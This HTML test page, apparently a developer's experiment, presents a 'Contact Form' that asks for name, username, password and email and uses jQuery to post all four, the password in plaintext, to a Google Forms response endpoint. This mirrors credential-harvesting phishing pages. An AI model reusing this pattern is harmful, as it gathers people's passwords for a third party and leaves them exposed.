<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GASFormTest</title>
</head>


<!-- stylesheet: https://codepen.io/colorlib/pen/KVoZyv -->
<style>
  @import url(https://fonts.googleapis.com/css?family=Roboto:400,300,600,400italic);
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  -webkit-font-smoothing: antialiased;
  -moz-font-smoothing: antialiased;
  -o-font-smoothing: antialiased;
  font-smoothing: antialiased;
  text-rendering: optimizeLegibility;
}

body {
  font-family: "Roboto", Helvetica, Arial, sans-serif;
  font-weight: 100;
  font-size: 12px;
  line-height: 30px;
  color: #777;
  background: #4CAF50;
}

.container {
  max-width: 400px;
  width: 100%;
  margin: 0 auto;
  position: relative;
}

#contact input[type="text"],
#contact input[type="email"],
#contact input[type="tel"],
#contact input[type="url"],
#contact textarea,
#contact button[type="submit"] {
  font: 400 12px/16px "Roboto", Helvetica, Arial, sans-serif;
}

#contact {
  background: #F9F9F9;
  padding: 25px;
  margin: 150px 0;
  box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
}

#contact h3 {
  display: block;
  font-size: 30px;
  font-weight: 300;
  margin-bottom: 10px;
}

#contact h4 {
  margin: 5px 0 15px;
  display: block;
  font-size: 13px;
  font-weight: 400;
}

fieldset {
  border: medium none !important;
  margin: 0 0 10px;
  min-width: 100%;
  padding: 0;
  width: 100%;
}

#contact input[type="text"],
#contact input[type="email"],
#contact input[type="tel"],
#contact input[type="url"],
#contact textarea {
  width: 100%;
  border: 1px solid #ccc;
  background: #FFF;
  margin: 0 0 5px;
  padding: 10px;
}

#contact input[type="text"]:hover,
#contact input[type="email"]:hover,
#contact input[type="tel"]:hover,
#contact input[type="url"]:hover,
#contact textarea:hover {
  -webkit-transition: border-color 0.3s ease-in-out;
  -moz-transition: border-color 0.3s ease-in-out;
  transition: border-color 0.3s ease-in-out;
  border: 1px solid #aaa;
}

#contact textarea {
  height: 100px;
  max-width: 100%;
  resize: none;
}

#contact button[type="submit"] {
  cursor: pointer;
  width: 100%;
  border: none;
  background: #4CAF50;
  color: #FFF;
  margin: 0 0 5px;
  padding: 10px;
  font-size: 15px;
}

#contact button[type="submit"]:hover {
  background: #43A047;
  -webkit-transition: background 0.3s ease-in-out;
  -moz-transition: background 0.3s ease-in-out;
  transition: background-color 0.3s ease-in-out;
}

#contact button[type="submit"]:active {
  box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5);
}

.copyright {
  text-align: center;
}

#contact input:focus,
#contact textarea:focus {
  outline: 0;
  border: 1px solid #aaa;
}

::-webkit-input-placeholder {
  color: #888;
}

:-moz-placeholder {
  color: #888;
}

::-moz-placeholder {
  color: #888;
}

:-ms-input-placeholder {
  color: #888;
}
</style>

<body>
  <div class="container">
    <form id="contact" onsubmit="return postToGoogle();">
      <h3>Contact Form</h3>
      <h4>Connect with us</h4>
      <fieldset>
        <input  placeholder="Full Name"
                type="text" 
                name="entry.1885792234"
                data-name="fullname" 
                id="fullname" 
                required>
      </fieldset>
      <fieldset>
        <input 
                placeholder="Username" 
                type="text" 
                name="entry.1428236563"
                data-name="username" 
                id="username" 
                required>
      </fieldset>
      <fieldset>
        <input 
                placeholder="Password"
                type="password" 
                name="entry.828524932" 
                data-name="password" 
                id="password" 
                required>
      </fieldset>
      <fieldset>
        <input 
                placeholder="Email" 
                type="email"
                data-name="email" 
                id="email" 
                name="entry.1605899120"
                required>
      </fieldset>
      <fieldset>
        <button type="submit" id="contact-submit">Submit</button>
      </fieldset>
    </form>
  </div>

  <script>
    function postToGoogle() {
      var field1 = $("#fullname").val();
      var field2 = $("#username").val();
      var field3 = $("#password").val();
      var field4 = $("#email").val();

      $.ajax({
        url: "https://docs.google.com/forms/u/0/d/e/1FAIpQLSd1NIyGnpveP5-Ni7jaoiULCFzbasPIWunHebxZDUVX9o4ERg/formResponse",
        data: {
          "entry.1885792234": field1,
          "entry.1428236563": field2,
          "entry.828524932": field3,
          "entry.1605899120": field4
        },
        type: "POST",
        dataType: "xml",
        success: function (d) {
          $('#contact').trigger('reset');
        },
        error: function (x, y, z) {
          $('#contact').trigger('reset');
        }
      });
      return false;
    }
  </script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

</body>

</html>
